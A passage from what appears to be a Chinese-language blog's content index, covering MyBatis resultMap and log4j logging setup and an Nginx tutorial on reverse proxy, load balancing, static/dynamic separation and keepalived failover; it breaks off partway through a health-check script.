class="operator">/</span><span class="operator">/</span> 类型处理器  去寻找属性passwd这个字段</span><br><span class="line"><span class="keyword">select</span> id,name,passwd <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125;;</span><br></pre></td></tr></table></figure><p>解决办法：</p><ul><li>起别名</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">    select id,name,passwd as password from users where id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-2、resultMap"><a href="#5-2、resultMap" class="headerlink" title="5.2、resultMap"></a>5.2、resultMap</h3><p>结果集映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id  name  passwd</span><br><span class="line">id  name  password</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--结果集映射--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--column数据库中的字段，property实体类中的属性--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserId&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>resultMap</code> 元素是 MyBatis 中最重要最强大的元素</p></li><li><p>ResultMap 的设计思想是，对简单的语句做到零配置，对于复杂一点的语句，只需要描述语句之间的关系就行了</p></li><li><p><code>resultMap</code> 的优秀之处——你完全可以不用显式地配置它们</p></li></ul><h2 id="6、日志"><a href="#6、日志" class="headerlink" title="6、日志"></a>6、日志</h2><h3 id="6-1、日志工厂"><a href="#6-1、日志工厂" class="headerlink" title="6.1、日志工厂"></a>6.1、日志工厂</h3><p>如果一个数据库操作，出现了异常，需要排错，查看日志是最好的方法。</p><p>以前：debug</p><p>现在：日志工厂</p><p><img src="http://image.jh2ing.com/image-20210522124707379.png" alt="image-20210522124707379"></p><ul><li><p>SLF4J </p></li><li><p><strong>LOG4J</strong> </p></li><li><p>LOG4J2 </p></li><li><p>JDK_LOGGING </p></li><li><p>COMMONS_LOGGING </p></li><li><p><strong>STDOUT_LOGGING</strong> </p></li><li><p>NO_LOGGING</p></li></ul><p>在Mybatis中具体使用哪一个日志实现，在设置中设置</p><p><strong>STDOUT_LOGGING 标准日志输出</strong> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--标准日志输出--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20210522180329467.png" alt="image-20210522180329467"></p><h3 id="6-2、LOG4J"><a href="#6-2、LOG4J" class="headerlink" title="6.2、LOG4J"></a>6.2、LOG4J</h3><p>什么是log4j?</p><ul><li>Log4j是<a href="https://baike.baidu.com/item/Apache/8512995">Apache</a>的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%8F%B0/2438626">控制台</a>、文件、<a href="https://baike.baidu.com/item/GUI">GUI</a>组件</li><li>可以控制每一条日志的输出格式</li><li>定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程</li><li>可以通过一个<a href="https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550">配置文件</a>来灵活地进行配置</li></ul><p>1.先导入log4j的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.log4j.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将等级为DEBUG的日志信息输出到console和file这两个目的地，console 和file的定义在下面的代码</span></span><br><span class="line"><span class="attr">log4j.rootLogger</span>=<span class="string">DEBUG,console,file</span></span><br><span class="line"><span class="comment">#控制台输出的相关设置</span></span><br><span class="line"><span class="attr">log4j.appender.console</span> = <span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="attr">log4j.appender.console.Target</span>=<span class="string">System.out</span></span><br><span class="line"><span class="attr">log4j.appender.console.Threshold</span> = <span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.appender.console.layout</span> = <span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.console.layout.ConversionPattern</span>=<span class="string">[%c]-%m%n</span></span><br><span class="line"><span class="comment">#文件输出的相关设置</span></span><br><span class="line"><span class="attr">log4j.appender.file</span> = <span class="string">org.apache.log4j.RollingFileAppender</span></span><br><span class="line"><span class="attr">log4j.appender.file.File</span>=<span class="string">./log/jh2ng.log</span></span><br><span class="line"><span class="attr">log4j.appender.file.MaxFileSize</span>=<span class="string">10mb</span></span><br><span class="line"><span class="attr">log4j.appender.file.Threshold</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.appender.file.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.file.layout.ConversionPattern</span>=<span class="string">[%p][%d[yy-MM-dd]][%c]%m%n</span></span><br><span class="line"><span class="comment">#日志输出级别</span></span><br><span class="line"><span class="attr">log4j.logger.org.mybatis</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.Statement</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.ResultSet</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.PreparedStatement</span>=<span class="string">DEBUG</span></span><br></pre></td></tr></table></figure><p>3.配置log4j的日志实现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--LOG4J--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOG4J&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.log4j的使用</p><p><img src="http://image.jh2ing.com/image-20210522185522131.png" alt="image-20210522185522131"></p><p><strong>简单使用</strong></p><p>1.在要使用log4j的类中导入包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.log4j.Logger;</span><br></pre></td></tr></table></figure><p>2.日志对象，参数为当前类的class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(UserDaoTest.class); <span class="comment">// 在哪来类下使用就填那个类的class</span></span><br></pre></td></tr></table></figure><p>3.日志级别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;info:进入了test&quot;</span>);</span><br><span class="line">logger.debug(<span class="string">&quot;debug:进入了test&quot;</span>);</span><br><span class="line">logger.error(<span class="string">&quot;error:进入了test&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 介绍及基础配置</title>
      <link href="/posts/493/"/>
      <url>/posts/493/</url>
      
        <content type="html"><![CDATA[<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>如果把局域网外的internet想象成一个巨大的资源库，那么局域网中的客户端要访问internet，则需要通过代理服务器来访问，这种代理服务器就称之为正向代理。</p><p>在客户端（浏览器）配置代理服务器，通过代理服务器进行互联网访问。</p><p><img src="https://b3logfile.com/file/2020/10/image-3b1c88c5.png" alt="image.png"></p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理，其客户端对这种代理是无感知的，客户端不需要做任何配置就访问服务，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据，再返回给客户端。这时反向代理服务器和目标服务器对外就是一个服务器。</p><p>客户端去访问<a href="">www.xxx.com</a>这个网站时，这个反向代理服务器会将你的请求转发给其它的服务器（随机），然后再返回请求。</p><p><img src="https://b3logfile.com/file/2020/10/image-a5f1ab35.png" alt="image.png"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>单个服务器解决不了，就增加服务器的数量，然后将请求分发到各个服务器上，将原来请求集中到单个服务器上的情况改为多个服务器，将负载分发到不同服务器，也就是所谓的负载均衡。</p><p>客户端发送多个请求到服务器，服务器处理请求，有一些可能要与数据库进行交互，服务器处理完毕之后再将结果返回给客户端，这种情况在处理并发请求较少的情况下是比较合适的，成本也低，但随着数据量不断增加，业务复杂程度增加，就会造成请求变得缓慢。这时我们会选择升级服务器配置，来解决这个问题，但是服务器配置也是有限的。下图看着跟反向代理一样，区别就是负载均衡对反向代理增加了一些策略配置，我客户端15个请求去访问，而代理服务器会根据设定的策略将请求转发给对应的服务器，一个服务器去处理5个请求，对负载进行分流，从而减轻压力。</p><p><img src="https://b3logfile.com/file/2020/10/image-d18e63ce.png" alt="image.png"></p><h3 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h3><p>为了加快服务器的解析速度，可以把动态页面和静态页面由不同的服务器来解析，加快解析速度，降低服务器的压力。</p><p><img src="https://b3logfile.com/file/2020/10/image-5f36d14e.png" alt="image.png"></p><p>简单来说就是把动态跟静态请求分开，不能理解成只是单纯的把动态页面和静态页面物理分离，严格来说就是把动态请求和静态请求分开，可以理解为使用nginx处理静态请求，tomcat处理动态页面。静动分离有两种，一种是把静态文件独立成单独域名放在独立服务器上，另一种是动态和静态文件混合在一起，使用nginx来分开。</p><h3 id="Nginx环境搭建"><a href="#Nginx环境搭建" class="headerlink" title="Nginx环境搭建"></a>Nginx环境搭建</h3><p>参考链接</p><blockquote><p><a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a></p></blockquote><h3 id="Nginx配置文件"><a href="#Nginx配置文件" class="headerlink" title="Nginx配置文件"></a>Nginx配置文件</h3><p><strong>第一部分：全局块</strong></p><p>主要设置一些影响nginx服务器整体运行的命令，主要包括配置运行nginx服务器的用户（组）、允许生成的worker process数，进程PID存放路径、日志存放路径和类型以及配置文件的引入等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid </span><br></pre></td></tr></table></figure><p>worker_processes是nginx服务器并发处理服务的关键配置，其值越大，处理并发量也越多，但是会受到设备限制。</p><p><strong>第二部分：events块</strong></p><p>主要影响nginx服务器与用户的网络连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最大连接数1024，此配置对nginx性能影响较大，根据实际情况灵活配置。</p><p><strong>第三部分：http块</strong></p><p>nginx配置最频繁的部分。代理、缓存、日志定义等大部分功能和第三方模块都在此配置。</p><p>http块也包括http全局块、server块。</p><ol><li>http全局块</li></ol><p>htpp全局配置包括文件引入、MIME-TYPE定义、日志自定义、连接超时时间、单链接请求数上限等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line">...............</span><br></pre></td></tr></table></figure><ol start="2"><li>sever块</li></ol><p>和虚拟主机有密切关系，每个http块可以包括多个server块，而每个server块就相当于一个虚拟主机，而每个server块也分为全局server块，以及可以同时包含多个location块。</p><ul><li>全局sever块</li></ul><p>本虚拟主机监听配置和主机的名称或IP配置</p><p>location块</p><p>基于nginx服务器接收到的请求字符串，对虚拟主机名称之外的字符串进行匹配(&#x2F;uri_string)，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能，许多的第三方模块的配置也在这里进行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">    #监听端口</span><br><span class="line">        listen       80;</span><br><span class="line">        #主机名  </span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line">        #本地路径</span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>location通过一些正则来进行匹配。</p><p>匹配机制链接</p><blockquote><p><a href="https://www.cnblogs.com/IPYQ/p/7889399.html">https://www.cnblogs.com/IPYQ/p/7889399.html</a></p></blockquote><h3 id="实验环境准备"><a href="#实验环境准备" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><ul><li>java</li><li>tomcat</li></ul><blockquote><p>下载链接</p><p><a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></p><p><a href="http://tomcat.apache.org/download-80.cg">http://tomcat.apache.org/download-80.cg</a></p></blockquote><p>访问过程</p><p><img src="https://b3logfile.com/file/2020/10/image-e33bcaaa.png"></p><h3 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h3><p>在windows系统的host文件进行域名和ip对应关系的配置</p><p><img src="https://b3logfile.com/file/2020/10/image-9dc32176.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-fc679ffe.png"></p><p>访问成功</p><p><img src="https://b3logfile.com/file/2020/10/image-177dc391.png"></p><p><strong>nginx配置反向代理（一）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  192.168.73.138;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://127.0.0.1:8080;</span><br><span class="line">           root   html;</span><br><span class="line">           index  index.html index.htm;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>proxy_pass </code>  这个参数就是做代理转发。</p><p>这里重新加载报错</p><p><img src="https://b3logfile.com/file/2020/10/image-3b4abd50.png"></p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/webserver/nginx/sbin/nginx -c /usr/local/webserver/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>然后在重新reload。。。</p><p>最后的效果图</p><p><img src="https://b3logfile.com/file/2020/10/image-3385d7b3.png"></p><p><strong>nginx配置反向代理（二）</strong></p><p>使用nginx反向代理，通过路径跳转到不同端口的服务中去，比如访问 <a href="http://127.0.0.1:9001/test1/">http://127.0.0.1:9001/test1/</a> 直接跳转到127.0.0.1:8080，访问 <a href="http://127.0.0.1:9001/test2/">http://127.0.0.1:9001/test2/</a> 直接跳转到127.0.0.1:8081。</p><p>在Linux复制tomcat，修改conf配置文件server.xml，更改端口号，然后再启动tomcat，注意防火墙的端口配置规则。</p><p><img src="https://b3logfile.com/file/2020/10/image-15a01c2a.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-f728e6c5.png"></p><p>为了区别两个tomcat，分别在tomcat的webapps中创建目录并写入内容</p><p><img src="https://b3logfile.com/file/2020/10/image-f746699b.png"></p><p>nginx具体配置</p><p><img src="https://b3logfile.com/file/2020/10/image-0cf75e02.png"></p><p>测试</p><p><img src="https://b3logfile.com/file/2020/10/image-e91b1e88.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-06fffeaa.png"></p><h3 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a>负载均衡配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">  upstream myserver&#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server IP:端口 weight=1;</span><br><span class="line">    fair;</span><br><span class="line">  &#125;</span><br><span class="line">  server&#123;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">      proxy_pass http://myserver;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>轮询（默认）</strong></li></ul><p>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器关闭，能自动剔除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>weight（权重）</strong></li></ul><p>weight代表权，默认为1，权重越高分配越多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口 weight=1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>ip_hash</strong></li></ul><p>每个请求按访问ip的hash结果分配，这样每个访客固定一个后端服务器，可以解决session问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server IP:端口;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>fair（第三方）</strong></li></ul><p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口;</span><br><span class="line">    fair;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>eg.</strong></p><p><img src="https://b3logfile.com/file/2020/10/image-fb1976a0.png"></p><h3 id="静动分离配置"><a href="#静动分离配置" class="headerlink" title="静动分离配置"></a>静动分离配置</h3><p>通过location指定不同的后缀名实现不同的请求转发，通过expires参数设置，可以使浏览器缓存过期时间，减少与服务器之前的请求和流量，Expires定义:是给一个资源设定一个过期时间。</p><p>例如设置 expires 3d，表示在三天之内访问URL，发送一个请求，比对服务器该文件最后更新时间没有变化，则不会从服务器抓取，返回状态码304，如果有修改，则之间从服务器下载，返回状态码200，如果有经常更新的文件，不建议使用expires来缓存。</p><p><img src="https://b3logfile.com/file/2020/10/image-35e2d1f9.png"></p><p>root 指定资源文件夹</p><p><img src="https://b3logfile.com/file/2020/10/image-007983ee.png"></p><p>autoindex on 参数列出文件</p><p><img src="https://b3logfile.com/file/2020/10/image-c8391a06.png"></p><h3 id="nginx高可用"><a href="#nginx高可用" class="headerlink" title="nginx高可用"></a>nginx高可用</h3><p><img src="https://b3logfile.com/file/2020/10/image-bf9802cb.png"></p><p>当只有一台nginx服务器的时候，如果这台服务器宕机，那么所有业务服务都将终止。使用两台nginx服务器，一台当备用，当主服务器出现问题，就会转到备用服务器。</p><p>准备：</p><ul><li>两台服务器192.168.73.11和192.168.73.10</li><li>两台服务器装nginx</li><li>两台服务器装keepalived</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install keepalived -y</span><br></pre></td></tr></table></figure><p>安装完成之后在etc里有keepalived目录，里面就是配置文件。</p><p><img src="https://b3logfile.com/file/2020/10/image-98f626ec.png"></p><p><strong>keepalived配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#全局定义</span><br><span class="line">global_defs &#123;</span><br><span class="line">  notification_email &#123;</span><br><span class="line">    acassen@firewall.loc</span><br><span class="line">    failover@firewall.loc</span><br><span class="line">    sysadmin@firewall.loc</span><br><span class="line">  &#125;</span><br><span class="line">  notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">  smtp_ server 192.168.73.11</span><br><span class="line">  smtp_connect_timeout 30</span><br><span class="line">  router_id LVS_DEVEL # LVS_DEVEL这字段在/etc/hosts文件中看；通过它访问到主机</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#检查脚本</span><br><span class="line">vrrp_script chk_http_ port &#123;</span><br><span class="line">  script &quot;/usr/local/src/nginx_check.sh&quot;</span><br><span class="line">  interval 2   # (检测脚本执行的间隔)2s</span><br><span class="line">  weight 2  #权重，如果这个脚本检测为真，服务器权重+2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#虚拟IP</span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">  state MASTER  # 备份服务器上将MASTER 改为BACKUP</span><br><span class="line">  interface ens33 //网卡名称</span><br><span class="line">  virtual_router_id 51 # 主、备机的virtual_router_id必须相同</span><br><span class="line">  priority 100   #主、备机取不同的优先级，主机值较大，备份机值较小</span><br><span class="line">  advert_int 1  #每隔1s发送一次心跳</span><br><span class="line">  authentication &#123;  # 校验方式， 类型是密码，密码1111</span><br><span class="line">        auth type PASS</span><br><span class="line">        auth pass 1111</span><br><span class="line">    &#125;</span><br><span class="line">  virtual_ipaddress &#123; # 虛拟ip</span><br><span class="line">    192.168.73.50 // VRRP H虛拟ip地址</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>router_id LVS_DEVEL 唯一标识</p><p><img src="https://b3logfile.com/file/2020/10/image-5c60426b.png"></p><p><strong>检查脚本nginx_check.sh</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">A=`ps -C nginx -no-header | wc - 1`</span><br><span class="line">if [ $A -eq 0];then</span><br><span class="line">  /usr/local/webserver/nginx/sbin</span><br><span class="line">  sleep 2</span><br><span 